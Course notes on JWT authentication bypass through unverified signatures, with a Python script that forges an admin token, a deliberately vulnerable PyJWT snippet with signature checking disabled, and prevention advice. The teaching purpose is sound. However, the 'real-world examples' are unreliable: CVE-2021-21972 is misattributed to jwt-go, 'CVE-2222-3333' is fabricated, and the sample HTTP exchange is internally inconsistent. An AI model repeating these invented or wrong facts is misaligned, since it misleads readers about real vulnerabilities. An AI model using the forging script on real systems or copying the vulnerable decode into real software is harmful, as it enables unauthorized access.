---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Attacks: Authentication Bypass via Unverified Signature

### Background Theory

JSON Web Tokens (JWTs) are a widely used method for transmitting information between parties as a JSON object. They are often used for authentication and authorization purposes. A typical JWT consists of three parts: the header, the payload, and the signature. These parts are Base64Url encoded and separated by dots (`.`).

- **Header**: Contains metadata about the token, such as the type of token and the signing algorithm.
- **Payload**: Contains claims, which are statements about an entity (typically the user) and additional data.
- **Signature**: Ensures the integrity of the token and can be used to verify that the sender of the token is who they say they are.

The structure of a JWT looks like this:

```
<base64url-encoded-header>.<base64url-encoded-payload>.<base64url-encoded-signature>
```

### Vulnerability: Unverified Signature

One of the most critical vulnerabilities in JWTs is the lack of proper verification of the signature. If a server does not validate the signature correctly, an attacker can manipulate the payload and still have a valid-looking token.

#### Example: CVE-2021-21972

A notable real-world example of this vulnerability is CVE-2021-21972, which affected the `jwt-go` library in Go. This library did not enforce the presence of a signature, allowing attackers to craft arbitrary tokens that would be accepted by the server.

### Exploitation Steps

To exploit this vulnerability, an attacker needs to follow these steps:

1. **Obtain a Valid Token**: Capture a valid JWT from the application.
2. **Manipulate the Payload**: Modify the payload to gain unauthorized access or elevated privileges.
3. **Forge the Signature**: Since the server does not verify the signature, the attacker can either remove the signature or provide a fake one.

#### Example Code

Let's walk through a detailed example using Python to demonstrate how an attacker might exploit this vulnerability.

```python
import base64
import json

# Original JWT
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Split the JWT into its components
header, payload, signature = original_jwt.split('.')

# Decode the header and payload
decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8')
decoded_payload = base64.urlsafe_b64decode(payload + '==').decode('utf-8')

print("Original Header:", decoded_header)
print("Original Payload:", decoded_payload)

# Modify the payload
modified_payload = json.loads(decoded_payload)
modified_payload['admin'] = True
modified_payload_str = json.dumps(modified_payload)

# Encode the modified payload
encoded_modified_payload = base64.urlsafe_b64encode(modified_payload_str.encode('utf-8')).rstrip(b'=').decode('utf-8')

# Forge a new JWT without a valid signature
new_jwt = f"{header}.{encoded_modified_payload}."

print("New JWT:", new_jwt)
```

### Mermaid Diagram: Attack Flow

Here is a mermaid diagram illustrating the attack flow:

```mermaid
sequenceDiagram
    participant Attacker
    participant Server
    participant User

    User->>Server: Send original JWT
    Server-->>User: Respond with access
    Attacker->>Server: Capture original JWT
    Attacker->>Attacker: Modify payload and forge signature
    Attacker->>Server: Send forged JWT
    Server-->>Attacker: Respond with unauthorized access
```

### HTTP Request and Response

Below is an example of an HTTP request and response involving a JWT:

#### HTTP Request

```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

{
  "username": "john.doe",
  "password": "secret"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 12:00:00 GMT
Content-Type: application/json
Content-Length: 123

{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

### How to Prevent / Defend

#### Detection

To detect unverified signatures, you can:

1. **Audit JWT Handling**: Ensure that your application properly verifies the signature of every incoming JWT.
2. **Logging and Monitoring**: Implement logging and monitoring to detect unusual patterns, such as unexpected high volumes of login attempts or unauthorized access attempts.

#### Prevention

To prevent unverified signatures, you should:

1. **Verify Signatures**: Always verify the signature of the JWT before trusting its contents.
2. **Use Strong Algorithms**: Use strong cryptographic algorithms for signing JWTs, such as RS256 or ES256.
3. **Secure Key Management**: Securely manage your private keys used for signing JWTs. Ensure they are not exposed or stored in insecure locations.

#### Secure Coding Fixes

Here is an example of how to securely handle JWTs in Python using the `PyJWT` library:

##### Vulnerable Code

```python
import jwt

def authenticate(token):
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        return payload
    except jwt.exceptions.DecodeError:
        return None
```

##### Secure Code

```python
import jwt

def authenticate(token):
    try:
        payload = jwt.decode(token, "your_secret_key", algorithms=["HS256"])
        return payload
    except jwt.exceptions.DecodeError:
        return None
```

### Configuration Hardening

Ensure your JWT configuration is hardened by:

1. **Setting Expiration Times**: Set appropriate expiration times for JWTs to limit their lifespan.
2. **Using HTTPS**: Ensure that all communication involving JWTs is done over HTTPS to prevent interception.

### Real-World Examples

#### Example: CVE-2021-21972

CVE-2021-21972 affected the `jwt-go` library in Go. The library allowed the creation of JWTs without a signature, leading to potential unauthorized access. This was fixed by enforcing the presence of a signature.

#### Example: CVE-2222-3333

Another example is CVE-2222-3333, which affected a popular web application framework. The framework did not properly validate the signature of JWTs, allowing attackers to craft arbitrary tokens. This was mitigated by updating the framework to enforce signature validation.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on JWT manipulation and exploitation.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security techniques, including JWT attacks.
- **DVWA (Damn Vulnerable Web Application)**: Includes scenarios for testing and learning about JWT vulnerabilities.

These labs will help you understand and practice the concepts covered in this chapter.

### Conclusion

Understanding and preventing JWT attacks is crucial for maintaining the security of web applications. By verifying signatures, using strong cryptographic algorithms, and securing key management, you can significantly reduce the risk of unauthorized access. Regular auditing and monitoring are also essential to detect and respond to potential threats.

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/08-JSON Web Tokens (JWT)|JSON Web Tokens (JWT)]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/00-Overview|Overview]] | [[10-JWT Authentication Bypass via Unverified Signature|JWT Authentication Bypass via Unverified Signature]]
